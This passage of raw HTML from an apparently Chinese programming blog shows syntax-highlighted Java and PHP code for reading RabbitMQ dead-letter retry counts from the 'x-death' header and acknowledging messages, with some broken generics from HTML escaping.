!important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nprotected Long getRetryCount(AMQP.BasicProperties properties) {\r\n    Long retryCount = 0L;\r\n    try {\r\n        Map headers = properties.getHeaders();\r\n        if (headers != null) {\r\n            if (headers.containsKey(\"x-death\")) {\r\n                List\r\n\r\n\r\n\r\n&lt;map&gt;&gt; deaths = (List\r\n\r\n\r\n\r\n&lt;map&gt;&gt;) headers.get(\"x-death\");\r\n                if (deaths.size() &gt; 0) {\r\n                    Map death = deaths.get(0);\r\n                    retryCount = (Long) death.get(\"count\");\r\n                }\r\n            }\r\n        }\r\n    } catch (Exception e) {}\r\n\r\n    return retryCount;\r\n}&lt;/map&gt;\r\n \r\n\r\n\r\n&lt;/map&gt;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51de852337675-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51de852337675-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51de852337675-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51de852337675-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51de852337675-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51de852337675-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51de852337675-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51de852337675-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51de852337675-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51de852337675-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51de852337675-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51de852337675-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51de852337675-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51de852337675-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51de852337675-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51de852337675-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51de852337675-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51de852337675-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51de852337675-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51de852337675-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51de852337675-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51de852337675-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51de852337675-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51de852337675-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51de852337675-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51de852337675-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51de852337675-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51de852337675-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51de852337675-29\">29</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623eb2c51de852337675-1\"><span class=\"crayon-m\">protected</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Long</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">getRetryCount</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">AMQP</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">BasicProperties </span><span class=\"crayon-v\">properties</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51de852337675-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">Long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">retryCount</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0L</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51de852337675-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">try</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51de852337675-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">Map </span><span class=\"crayon-v\">headers</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">properties</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getHeaders</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51de852337675-5\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">headers</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51de852337675-6\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">headers</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">containsKey</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"x-death\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51de852337675-7\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">List</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51de852337675-8\"> </div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51de852337675-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51de852337675-10\"> </div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51de852337675-11\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">map</span><span class=\"crayon-o\">&gt;&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">deaths</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">List</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51de852337675-12\"> </div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51de852337675-13\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51de852337675-14\"> </div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51de852337675-15\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">map</span><span class=\"crayon-o\">&gt;&gt;</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">headers</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"x-death\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51de852337675-16\"><span class=\"crayon-h\">                </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">deaths</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">size</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51de852337675-17\"><span class=\"crayon-h\">                    </span><span class=\"crayon-e\">Map </span><span class=\"crayon-v\">death</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">deaths</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51de852337675-18\"><span class=\"crayon-h\">                    </span><span class=\"crayon-v\">retryCount</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">Long</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">death</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"count\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51de852337675-19\"><span class=\"crayon-h\">                </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51de852337675-20\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51de852337675-21\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51de852337675-22\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">catch</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">Exception</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">e</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51de852337675-23\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51de852337675-24\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">retryCount</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51de852337675-25\"><span class=\"crayon-sy\">}</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">map</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51de852337675-26\"> </div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51de852337675-27\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51de852337675-28\"> </div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51de852337675-29\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">map</span><span class=\"crayon-o\">&gt;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0034 seconds] -->\r\n<p> </p>\n<p> </p>\n<p> </p>\n<p>PHP代码</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623eb2c51e1346730491\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nprotected function getRetryCount(AMQPMessage $msg): int\r\n{\r\n    $retry = 0;\r\n    if ($msg-&gt;has('application_headers')) {\r\n        $headers = $msg-&gt;get('application_headers')-&gt;getNativeData();\r\n        if (isset($headers['x-death'][0]['count'])) {\r\n            $retry = $headers['x-death'][0]['count'];\r\n        }\r\n    }\r\n\r\n    return (int)$retry;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51e1346730491-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51e1346730491-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51e1346730491-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51e1346730491-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51e1346730491-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51e1346730491-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51e1346730491-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51e1346730491-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51e1346730491-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51e1346730491-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51e1346730491-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51e1346730491-12\">12</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623eb2c51e1346730491-1\"><span class=\"crayon-m\">protected</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">function</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">getRetryCount</span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">AMQPMessage</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">msg</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51e1346730491-2\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51e1346730491-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">retry</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51e1346730491-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">msg</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">has</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'application_headers'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51e1346730491-5\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">headers</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">msg</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'application_headers'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">getNativeData</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51e1346730491-6\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">isset</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">headers</span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">'x-death'</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">'count'</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51e1346730491-7\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">retry</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">headers</span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">'x-death'</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">'count'</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51e1346730491-8\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51e1346730491-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51e1346730491-10\"> </div><div class=\"crayon-line\" id=\"crayon-5b623eb2c51e1346730491-11\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">retry</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623eb2c51e1346730491-12\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0022 seconds] -->\r\n<p>消息消费完成后，需要发送消费确认消息给服务端，使用<code>basic_ack</code>方法</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623eb2c51e5777941966\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nack(delivery-tag=消息的delivery-tag标识)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51e5777941966-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623eb2c51e5777941966-1\"><span class=\"crayon-e\">ack</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">delivery</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">tag</span><span class=\"crayon-o\">=</span>消息的<span class=\"crayon-v\">delivery</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">tag</span>标识<span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>Java代码</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623eb2c51e8913938516\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n// 消息消费处理\r\nConsumer consumer = new DefaultConsumer(channel) {\r\n    @ Override\r\n    public void handleDelivery(String consumerTag, Envelope envelope,\r\n                               AMQP.BasicProperties properties, byte[] body) throws IOException {\r\n        ...\r\n        // 注意，由于使用了basicConsume的autoAck特性，因此这里就不需要手动执行\r\n        // channel.basicAck(envelope.getDeliveryTag(), false);\r\n    }\r\n};\r\n// 执行消息消费处理\r\nchannel.basicConsume(\r\n    queueName, \r\n    true, // autoAck\r\n    consumer\r\n);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51e8913938516-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51e8913938516-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51e8913938516-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51e8913938516-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51e8913938516-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51e8913938516-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51e8913938516-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51e8913938516-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51e8913938516-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51e8913938516-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51e8913938516-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51e8913938516-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51e8913938516-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51e8913938516-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b623eb2c51e8913938516-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623eb2c51e8913938516-16\">16</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623eb2c51e8913938516-1\"><span class=\"crayon-c\">// 消息消费处理</span></div><div class=\"crayon-line crayon-striped-line\" 